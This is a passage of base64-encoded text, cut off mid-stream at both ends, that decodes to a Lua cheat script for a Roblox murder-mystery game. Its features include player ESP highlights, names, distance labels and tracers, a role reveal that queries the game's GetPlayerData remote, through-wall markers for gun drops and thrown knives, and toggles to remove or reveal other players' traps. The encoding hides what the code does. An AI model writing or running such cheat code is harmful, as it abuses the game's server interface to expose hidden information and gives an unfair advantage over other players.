GFyZW5jeSA9IHZhbHVlIC8gMTAwCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuQ2hhbVRyYW5zcGFyZW5jeSA9IGdldGdlbnYoKS5DaGFtVHJhbnNwYXJlbmN5CiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjMsICJFU1AgSGlnaGxpZ2h0IiwgIiIsIGdldGdlbnYoKS5ILCBmdW5jdGlvbihzdGF0ZSkKICAgIGdldGdlbnYoKS5IID0gc3RhdGUKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5IID0gc3RhdGUKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICBzdGFydEVTUEhpZ2hsaWdodCgpCiAgICBlbHNlCiAgICAgICAgc3RvcEVTUEhpZ2hsaWdodCgpCiAgICBlbmQKZW5kKQoKTGlicmFyeS5hZGRTbGlkZXIodGFiMywgIkVTUCBIaWdobGlnaHQgVHJhbnNwYXJlbmN5IiwgIkVTUCBIaWdobGlnaHQgVHJhbnNwYXJlbmN5IiwgMCwgMTAwLCBnZXRnZW52KCkuRiAqIDEwMCwgZnVuY3Rpb24odmFsdWUpCiAgICBnZXRnZW52KCkuRiA9IHZhbHVlIC8gMTAwCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuRiA9IGdldGdlbnYoKS5GCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCmVuZCkKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGFyYWN0ZXIpCiAgICAgICAgaWYgbm90IGdldGdlbnYoKS5FIHRoZW4KICAgICAgICAgICAgbG9jYWwgaGVhZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAgICAgICAgIGlmIGhlYWQgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgZ3VpID0gaGVhZDpGaW5kRmlyc3RDaGlsZCgiQmlsbGJvYXJkR3VpIikKICAgICAgICAgICAgICAgIGlmIGd1aSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ3VpOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQpCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIzLCAiRVNQIE5hbWUiLCAiIiwgZ2V0Z2VudigpLkUsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLkUgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkUgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQogICAgaWYgc3RhdGUgdGhlbgogICAgICAgIHN0YXJ0RVNQTmFtZSgpCiAgICBlbHNlCiAgICAgICAgc3RvcEVTUE5hbWUoKQogICAgZW5kCmVuZCkKCmdldGdlbnYoKS5zZCA9IGZhbHNlCmdldGdlbnYoKS5jbCA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCmdldGdlbnYoKS5iYyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCgpsb2NhbCBmdW5jdGlvbiBncihjaCkKCWxvY2FsIHJ0ID0gY2g6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBvciBjaDpGaW5kRmlyc3RDaGlsZCgiVG9yc28iKQoJcmV0dXJuIHJ0IG9yIGNoOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIsIDIpIG9yIGNoOkZpbmRGaXJzdENoaWxkKCJUb3JzbyIpCmVuZAoKbG9jYWwgZnVuY3Rpb24gY2cocGwpCglpZiBub3QgZ2V0Z2VudigpLnNkIHRoZW4gcmV0dXJuIGVuZAoJbG9jYWwgY2ggPSBwbC5DaGFyYWN0ZXIKCWlmIG5vdCBjaCB0aGVuIHJldHVybiBlbmQKCWxvY2FsIHJ0ID0gZ3IoY2gpCglpZiBub3QgcnQgdGhlbiByZXR1cm4gZW5kCglpZiBub3QgcnQ6RmluZEZpcnN0Q2hpbGQoIkRpc3RhbmNlQmlsbGJvYXJkIikgdGhlbgoJCWxvY2FsIGdiID0gSW5zdGFuY2UubmV3KCJCaWxsYm9hcmRHdWkiKQoJCWdiLk5hbWUgPSAiRGlzdGFuY2VCaWxsYm9hcmQiCgkJZ2IuUGFyZW50ID0gcnQKCQlnYi5BZG9ybmVlID0gcnQKCQlnYi5TaXplID0gVURpbTIubmV3KDAsIDMwLCAwLCAzMCkKCQlnYi5TdHVkc09mZnNldCA9IFZlY3RvcjMubmV3KDAsIDEsIDApCgkJZ2IuQWx3YXlzT25Ub3AgPSB0cnVlCgkJZ2IuUmVzZXRPblNwYXduID0gZmFsc2UKCQlnYi5FbmFibGVkID0gdHJ1ZQoKCQlsb2NhbCB0bCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKCQl0bC5QYXJlbnQgPSBnYgoJCXRsLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKCQl0bC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoJCXRsLlRleHRTY2FsZWQgPSB0cnVlCgkJdGwuVGV4dFNpemUgPSAxMQoJCXRsLlRleHRDb2xvcjMgPSBnZXRnZW52KCkuY2wKCQl0bC5UZXh0U3Ryb2tlVHJhbnNwYXJlbmN5ID0gMC44CgkJdGwuVGV4dFN0cm9rZUNvbG9yMyA9IGdldGdlbnYoKS5iYwoJCXRsLlRleHQgPSAiWzBdIgoJZW5kCmVuZAoKTGlicmFyeS5hZGRUb2dnbGUodGFiMywgIkVTUCBTdHVuZHMiLCAiIiwgZmFsc2UsIGZ1bmN0aW9uKHMpCglnZXRnZW52KCkuc2QgPSBzCglmb3IgXywgcGwgaW4gaXBhaXJzKGdhbWUuUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCgkJaWYgcGwgfj0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyIGFuZCBwbC5DaGFyYWN0ZXIgdGhlbgoJCQlsb2NhbCBydCA9IGdyKHBsLkNoYXJhY3RlcikKCQkJbG9jYWwgZ2IgPSBydCBhbmQgcnQ6RmluZEZpcnN0Q2hpbGQoIkRpc3RhbmNlQmlsbGJvYXJkIikKCQkJaWYgcyB0aGVuCgkJCQljZyhwbCkKCQkJCWlmIGdiIHRoZW4gZ2IuRW5hYmxlZCA9IHRydWUgZW5kCgkJCWVsc2UKCQkJCWlmIGdiIHRoZW4gZ2I6RGVzdHJveSgpIGVuZAoJCQllbmQKCQllbmQKCWVuZAplbmQpCgpsb2NhbCBmdW5jdGlvbiBzZXR1cFBsYXllcihwbCkKCWlmIHBsIH49IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllciB0aGVuCgkJcGwuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaCkKCQkJaWYgZ2V0Z2VudigpLnNkIHRoZW4gY2cocGwpIGVuZAoJCWVuZCkKCQlpZiBnZXRnZW52KCkuc2QgYW5kIHBsLkNoYXJhY3RlciB0aGVuCgkJCWNnKHBsKQoJCWVuZAoJZW5kCmVuZAoKZm9yIF8sIHBsIGluIGlwYWlycyhnYW1lLlBsYXllcnM6R2V0UGxheWVycygpKSBkbwoJc2V0dXBQbGF5ZXIocGwpCmVuZAoKZ2FtZS5QbGF5ZXJzLlBsYXllckFkZGVkOkNvbm5lY3Qoc2V0dXBQbGF5ZXIpCgpnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCglpZiBub3QgZ2V0Z2VudigpLnNkIHRoZW4gcmV0dXJuIGVuZAoJbG9jYWwgbHAgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKCWlmIG5vdCBscCBvciBub3QgbHAuQ2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZAoJbG9jYWwgcnQgPSBncihscC5DaGFyYWN0ZXIpCglpZiBub3QgcnQgdGhlbiByZXR1cm4gZW5kCglmb3IgXywgcGwgaW4gaXBhaXJzKGdhbWUuUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCgkJaWYgcGwgfj0gbHAgYW5kIHBsLkNoYXJhY3RlciB0aGVuCgkJCWxvY2FsIHIgPSBncihwbC5DaGFyYWN0ZXIpCgkJCWlmIHIgdGhlbgoJCQkJbG9jYWwgZ2IgPSByOkZpbmRGaXJzdENoaWxkKCJEaXN0YW5jZUJpbGxib2FyZCIpCgkJCQlpZiBnYiB0aGVuCgkJCQkJbG9jYWwgdGwgPSBnYjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlRleHRMYWJlbCIpCgkJCQkJaWYgdGwgdGhlbgoJCQkJCQlsb2NhbCBkID0gKHIuUG9zaXRpb24gLSBydC5Qb3NpdGlvbikuTWFnbml0dWRlCgkJCQkJCXRsLlRleHQgPSBzdHJpbmcuZm9ybWF0KCJbJS4xZl0iLCBkKQoJCQkJCWVuZAoJCQkJZW5kCgkJCWVuZAoJCWVuZAoJZW5kCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjMsICJFU1AgVHJhY2VyIiwgIiIsIGdldGdlbnYoKS5ULCBmdW5jdGlvbihzdGF0ZSkKICAgIGdldGdlbnYoKS5UID0gc3RhdGUKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5UID0gc3RhdGUKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKICAgIGlmIG5vdCBzdGF0ZSB0aGVuCiAgICAgICAgZm9yIF8sIGxpbmUgaW4gcGFpcnModHJhY2VyRHJhd2luZ3MpIGRvCiAgICAgICAgICAgIGxpbmU6UmVtb3ZlKCkKICAgICAgICBlbmQKICAgICAgICB0cmFjZXJEcmF3aW5ncyA9IHt9CiAgICBlbmQKZW5kKQoKbG9jYWwgYSwgYiwgYywgZCwgZSA9IFBsYXllcnMuTG9jYWxQbGF5ZXIsIGdldGdlbnYoKS5zYXZlZENvbmZpZy5zY3JpcHRFbmFibGVkIG9yIGZhbHNlLCBuaWwsIGZhbHNlLCBuaWwKCmxvY2FsIGZ1bmN0aW9uIGYoKQogICAgbG9jYWwgZyA9IFJlcGxpY2F0ZWRTdG9yYWdlOkZpbmRGaXJzdENoaWxkKCJHZXRQbGF5ZXJEYXRhIiwgdHJ1ZSk6SW52b2tlU2VydmVyKCkKICAgIGxvY2FsIGggPSBnW2EuTmFtZV0KICAgIHJldHVybiBoIGFuZCBoLlJvbGUKZW5kCgpsb2NhbCBmdW5jdGlvbiBpKGopCiAgICBpZiBlIHRoZW4gZTpEZXN0cm95KCkgZW5kCiAgICBlID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgZS5OYW1lID0gIlJvbGVMYWJlbCIKICAgIGUuU2l6ZSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDUwKQogICAgZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0xMDAsIDAuMSwgMCkKICAgIGUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIGUuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zCiAgICBlLlRleHRTY2FsZWQgPSB0cnVlCiAgICBpZiBqID09ICJNdXJkZXJlciIgdGhlbgogICAgICAgIGUuVGV4dCA9ICJNVVJERVJFUiIKICAgICAgICBlLlRleHRDb2xvcjMgPSBDb2xvcjMubmV3KDEsIDAsIDApCiAgICBlbHNlaWYgaiA9PSAiU2hlcmlmZiIgdGhlbgogICAgICAgIGUuVGV4dCA9ICJTSEVSSUZGIgogICAgICAgIGUuVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMCwgMCwgMSkKICAgIGVsc2UKICAgICAgICBlLlRleHQgPSAiSU5OT0NFTlQiCiAgICAgICAgZS5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygwLCAxLCAwKQogICAgZW5kCiAgICBlLlBhcmVudCA9IGE6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKTpXYWl0Rm9yQ2hpbGQoIk1haW5HVUkiKQplbmQKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjMsICJJbnN0YW50IHJvbGUiLCAiIiwgYiwgZnVuY3Rpb24oaykKICAgIGIgPSBrCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuc2NyaXB0RW5hYmxlZCA9IGsKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKCiAgICBpZiBrIHRoZW4KICAgICAgICBjID0gUnVuU2VydmljZS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBhLkNoYXJhY3RlciBvciBub3QgYS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgbG9jYWwgbCA9IGE6RmluZEZpcnN0Q2hpbGQoIlBsYXllckd1aSIpCiAgICAgICAgICAgIGxvY2FsIG0gPSBsIGFuZCBsOkZpbmRGaXJzdENoaWxkKCJNYWluR1VJIikKICAgICAgICAgICAgbG9jYWwgbiA9IG0gYW5kIG06RmluZEZpcnN0Q2hpbGQoIkdhbWUiKQogICAgICAgICAgICBsb2NhbCBvID0gbiBhbmQgbjpGaW5kRmlyc3RDaGlsZCgiUm9sZVNlbGVjdG9yIikKICAgICAgICAgICAgaWYgbm90IG8gdGhlbiByZXR1cm4gZW5kCgogICAgICAgICAgICBpZiBvLlZpc2libGUgYW5kIG5vdCBkIHRoZW4KICAgICAgICAgICAgICAgIGQgPSB0cnVlCiAgICAgICAgICAgICAgICBsb2NhbCBwID0gZigpCiAgICAgICAgICAgICAgICBpZiBwIHRoZW4gaShwKSBlbmQKICAgICAgICAgICAgZWxzZWlmIG5vdCBvLlZpc2libGUgYW5kIGQgdGhlbgogICAgICAgICAgICAgICAgZCA9IGZhbHNlCiAgICAgICAgICAgICAgICBpZiBlIHRoZW4gZTpEZXN0cm95KCkgZSA9IG5pbCBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIGlmIGMgdGhlbiBjOkRpc2Nvbm5lY3QoKSBlbmQKICAgICAgICBjID0gbmlsCiAgICAgICAgZCA9IGZhbHNlCiAgICAgICAgaWYgZSB0aGVuIGU6RGVzdHJveSgpIGUgPSBuaWwgZW5kCiAgICBlbmQKZW5kKQoKTGlicmFyeS5hZGRMYWJlbCh0YWIzLCAiR3VuIFN0dWZmIikKCmdldGdlbnYoKS5hPW5pbApnZXRnZW52KCkuYj1uaWwKZ2V0Z2VudigpLmM9Z2V0Z2VudigpLnNhdmVkQ29uZmlnLmVzcEFjdGl2ZSBvciBmYWxzZQpnZXRnZW52KCkuZD1nZXRnZW52KCkuc2F2ZWRDb25maWcubm90aWZpZXJFbmFibGVkIG9yIGZhbHNlCmdldGdlbnYoKS5lPW5pbApsb2NhbCBmPWdldGdlbnYoKQoKZi5nPWZ1bmN0aW9uKGgpCiAgICBpZiBub3QgaDpGaW5kRmlyc3RDaGlsZCgiaDEiKSB0aGVuCiAgICAgICAgbG9jYWwgaT1JbnN0YW5jZS5uZXcoIkhpZ2hsaWdodCIpCiAgICAgICAgaS5OYW1lPSJoMSIKICAgICAgICBpLkZpbGxDb2xvcj1Db2xvcjMuZnJvbVJHQigyNTUsMCwyNTUpCiAgICAgICAgaS5PdXRsaW5lQ29sb3I9Q29sb3IzLmZyb21SR0IoMjU1LDAsMjU1KQogICAgICAgIGkuRGVwdGhNb2RlPUVudW0uSGlnaGxpZ2h0RGVwdGhNb2RlLkFsd2F5c09uVG9wCiAgICAgICAgaS5QYXJlbnQ9aAogICAgZW5kCiAgICBpZiBub3QgaDpGaW5kRmlyc3RDaGlsZCgiYjEiKSB0aGVuCiAgICAgICAgbG9jYWwgaj1JbnN0YW5jZS5uZXcoIkJpbGxib2FyZEd1aSIpCiAgICAgICAgai5OYW1lPSJiMSIKICAgICAgICBqLkFkb3JuZWU9aAogICAgICAgIGouU2l6ZT1VRGltMi5uZXcoMCwyMDAsMCwzMCkKICAgICAgICBqLlN0dWRzT2Zmc2V0PVZlY3RvcjMubmV3KDAsNSwwKQogICAgICAgIGouQWx3YXlzT25Ub3A9dHJ1ZQogICAgICAgIGouUGFyZW50PWgKICAgICAgICBsb2NhbCBrPUluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICBrLlNpemU9VURpbTIubmV3KDEsMCwxLDApCiAgICAgICAgay5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5PTEKICAgICAgICBrLlRleHRDb2xvcjM9Q29sb3IzLmZyb21SR0IoMjU1LDAsMjU1KQogICAgICAgIGsuVGV4dD0iR3VuRHJvcCBIRVJFIgogICAgICAgIGsuRm9udD1FbnVtLkZvbnQuU291cmNlU2Fuc0JvbGQKICAgICAgICBrLlRleHRTaXplPTIwCiAgICAgICAgay5QYXJlbnQ9agogICAgZW5kCiAgICBmLmU9aAplbmQKCmYuaD1mdW5jdGlvbigpCiAgICBpZiBmLmUgdGhlbgogICAgICAgIGxvY2FsIGk9Zi5lOkZpbmRGaXJzdENoaWxkKCJoMSIpCiAgICAgICAgaWYgaSB0aGVuIGk6RGVzdHJveSgpIGVuZAogICAgICAgIGxvY2FsIGo9Zi5lOkZpbmRGaXJzdENoaWxkKCJiMSIpCiAgICAgICAgaWYgaiB0aGVuIGo6RGVzdHJveSgpIGVuZAogICAgICAgIGYuZT1uaWwKICAgIGVuZAplbmQKCmYubj1mdW5jdGlvbigpCiAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIse1RpdGxlPSJHdW4gRGV0ZWN0ZWQiLFRleHQ9Ikd1bkRyb3AgaGFzIGFwcGVhcmVkLiIsRHVyYXRpb249NX0pCiAgICBlbmQpCmVuZAoKTGlicmFyeS5hZGRUb2dnbGUodGFiMywiR3VuRHJvcCBFU1AiLCJHdW5Ecm9wIEVTUCIsZi5jLGZ1bmN0aW9uKGopCiAgICBmLmM9agogICAgZi5zYXZlZENvbmZpZy5lc3BBY3RpdmU9agogICAgZi5zYXZlQ29uZmlnKGYuc2F2ZWRDb25maWcpCiAgICBpZiBmLmEgdGhlbiBmLmE6RGlzY29ubmVjdCgpIGYuYT1uaWwgZW5kCiAgICBmLmgoKQogICAgaWYgbm90IGogdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBrPXdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiR3VuRHJvcCIsdHJ1ZSkKICAgIGlmIGsgYW5kIGs6SXNBKCJQYXJ0IikgdGhlbiBmLmcoaykgZW5kCiAgICBmLmE9d29ya3NwYWNlLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKGwpCiAgICAgICAgaWYgbC5OYW1lPT0iR3VuRHJvcCIgYW5kIGw6SXNBKCJQYXJ0IikgdGhlbiBmLmcobCkgZW5kCiAgICBlbmQpCmVuZCkKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjMsIm5vdGlmaWVyIEd1biBEcm9wIiwibm90aWZpZXIgR3VuIERyb3AiLGYuZCxmdW5jdGlvbihtKQogICAgZi5kPW0KICAgIGYuc2F2ZWRDb25maWcubm90aWZpZXJFbmFibGVkPW0KICAgIGYuc2F2ZUNvbmZpZyhmLnNhdmVkQ29uZmlnKQogICAgaWYgZi5iIHRoZW4gZi5iOkRpc2Nvbm5lY3QoKSBlbmQKICAgIGYuYj1uaWwKICAgIGlmIG5vdCBtIHRoZW4gcmV0dXJuIGVuZAogICAgbG9jYWwgbj13b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIkd1bkRyb3AiLHRydWUpCiAgICBpZiBuIGFuZCBuOklzQSgiUGFydCIpIHRoZW4gZi5uKCkgZW5kCiAgICBmLmI9d29ya3NwYWNlLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKG8pCiAgICAgICAgaWYgby5OYW1lPT0iR3VuRHJvcCIgYW5kIG86SXNBKCJQYXJ0IikgdGhlbiBmLm4oKSBlbmQKICAgIGVuZCkKZW5kKQoKZ2V0Z2VudigpLmEgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcua25pZmVFU1Agb3IgZmFsc2UKCmxvY2FsIGZ1bmN0aW9uIGIoYykKICAgIGlmIGdldGdlbnYoKS5hIGFuZCBub3QgYzpGaW5kRmlyc3RDaGlsZCgiSGlnaGxpZ2h0IikgdGhlbgogICAgICAgIGxvY2FsIGQgPSBJbnN0YW5jZS5uZXcoIkhpZ2hsaWdodCIpCiAgICAgICAgZC5GaWxsQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigwLCAyMDAsIDE2MCkKICAgICAgICBkLk91dGxpbmVDb2xvciA9IENvbG9yMy5mcm9tUkdCKDAsIDIwMCwgMTYwKQogICAgICAgIGQuRmlsbFRyYW5zcGFyZW5jeSA9IDAKICAgICAgICBkLkRlcHRoTW9kZSA9IEVudW0uSGlnaGxpZ2h0RGVwdGhNb2RlLkFsd2F5c09uVG9wCiAgICAgICAgZC5PdXRsaW5lVHJhbnNwYXJlbmN5ID0gMAogICAgICAgIGQuQWRvcm5lZSA9IGMKICAgICAgICBkLlBhcmVudCA9IGMKICAgIGVuZAplbmQKCndvcmtzcGFjZS5EZXNjZW5kYW50QWRkZWQ6Q29ubmVjdChmdW5jdGlvbihlKQogICAgaWYgZ2V0Z2VudigpLmEgYW5kIGU6SXNBKCJNb2RlbCIpIGFuZCBlLk5hbWUgPT0gIlRocm93aW5nS25pZmUiIHRoZW4KICAgICAgICBiKGUpCiAgICBlbmQKZW5kKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiMywgIlNlZSBUaHJvd24gS25pZmUiLCAiIiwgZ2V0Z2VudigpLmEsIGZ1bmN0aW9uKGYpCiAgICBnZXRnZW52KCkuYSA9IGYKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5rbmlmZUVTUCA9IGYKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKCiAgICBpZiBub3QgZiB0aGVuCiAgICAgICAgZm9yIF8sIGcgaW4gaXBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBnOklzQSgiTW9kZWwiKSBhbmQgZy5OYW1lID09ICJUaHJvd2luZ0tuaWZlIiB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBoID0gZzpGaW5kRmlyc3RDaGlsZCgiSGlnaGxpZ2h0IikKICAgICAgICAgICAgICAgIGlmIGggdGhlbgogICAgICAgICAgICAgICAgICAgIGg6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKTGlicmFyeS5hZGRMYWJlbCh0YWIzLCAiVHJhcHMiKQpnZXRnZW52KCkuYSA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5yZW1vdmVUcmFwIG9yIGZhbHNlCmdldGdlbnYoKS5iID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLnNlZVRyYXBzIG9yIGZhbHNlCgpsb2NhbCBjID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgZCA9IGMuTG9jYWxQbGF5ZXIKCmxvY2FsIGZ1bmN0aW9uIGUoZikKICAgIGlmIGY6SXNBKCJNb2RlbCIpIGFuZCBmLk5hbWUgPT0gIlRyYXAiIHRoZW4KICAgICAgICBpZiBnZXRnZW52KCkuYSB0aGVuCiAgICAgICAgICAgIGY6RGVzdHJveSgpCiAgICAgICAgZWxzZWlmIGdldGdlbnYoKS5iIHRoZW4KICAgICAgICAgICAgaWYgbm90IGY6RmluZEZpcnN0Q2hpbGQoIlRyYXBMYWJlbCIpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGcgPSBJbnN0YW5jZS5uZXcoIkJpbGxib2FyZEd1aSIsIGYpCiAgICAgICAgICAgICAgICBnLk5hbWUgPSAiVHJhcExhYmVsIgogICAgICAgICAgICAgICAgZy5TaXplID0gVURpbTIubmV3KDAsIDEwMCwgMCwgNTApCiAgICAgICAgICAgICAgICBnLkFkb3JuZWUgPSBmOkZpbmRGaXJzdENoaWxkKCJQcmltYXJ5UGFydCIpIG9yIGYKICAgICAgICAgICAgICAgIGcuQWx3YXlzT25Ub3AgPSB0cnVlCiAgICAgICAgICAgICAgICBsb2NhbCBoID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiLCBnKQogICAgICAgICAgICAgICAgaC5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICAgICAgICAgICAgICBoLlRleHQgPSAiVHJhcCIKICAgICAgICAgICAgICAgIGguQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgIGguVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEzOCwgNDMsIDIyNikKICAgICAgICAgICAgICAgIGguVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBpKGopCiAgICBqLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGUpCiAgICBmb3IgXywgayBpbiBpcGFpcnMoajpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGUoaykKICAgIGVuZAplbmQKbG9jYWwgZnVuY3Rpb24gbChtKQogICAgaWYgbSB+PSBkIHRoZW4KICAgICAgICBtLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoaSkKICAgICAgICBpZiBtLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGkobS5DaGFyYWN0ZXIpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCmMuUGxheWVyQWRkZWQ6Q29ubmVjdChsKQpmb3IgXywgbiBpbiBwYWlycyhjOkdldFBsYXllcnMoKSkgZG8KICAgIGwobikKZW5kCgpsb2NhbCBmdW5jdGlvbiBvKCkKICAgIGZvciBfLCBwIGluIHBhaXJzKGM6R2V0UGxheWVycygpKSBkbwogICAgICAgIGlmIHAgfj0gZCBhbmQgcC5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICBmb3IgXywgcSBpbiBpcGFpcnMocC5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGUocSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIzLCAiUmVtb3ZlIFRyYXBzIiwgImRlc3RydWlyIHRyYW1wYXMiLCBnZXRnZW52KCkuYSwgZnVuY3Rpb24ocikKICAgIGdldGdlbnYoKS5hID0gcgogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLnJlbW92ZVRyYXAgPSByCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCiAgICBvKCkKZW5kKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiMywgIlNlZSBUcmFwcyIsICJWZXIgdHJhbXBhcyIsIGdldGdlbnYoKS5iLCBmdW5jdGlvbihzKQogICAgZ2V0Z2VudigpLmIgPSBzCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuc2VlVHJhcHMgPSBzCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCiAgICBvKCkKICAgIGlmIG5vdCBzIHRoZW4KICAgICAgICBmb3IgXywgdCBpbiBwYWlycyhjOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgdCB+PSBkIGFuZCB0LkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgdSBpbiBpcGFpcnModC5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB1OklzQSgiTW9kZWwiKSBhbmQgdS5OYW1lID09ICJUcmFwIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHU6RmluZEZpcnN0Q2hpbGQoIlRyYXBMYWJlbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHUuVHJhcExhYmVsOkRlc3Ryb3koKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpMaWJyYXJ5LmFkZEJ1dHRvbih0YWIzLCAiUGxhY2UgVHJhcCAodG91Y2gpIiwgIiIsIGZ1bmN0aW9uKCkKaWYgZ2FtZS5QbGF5ZX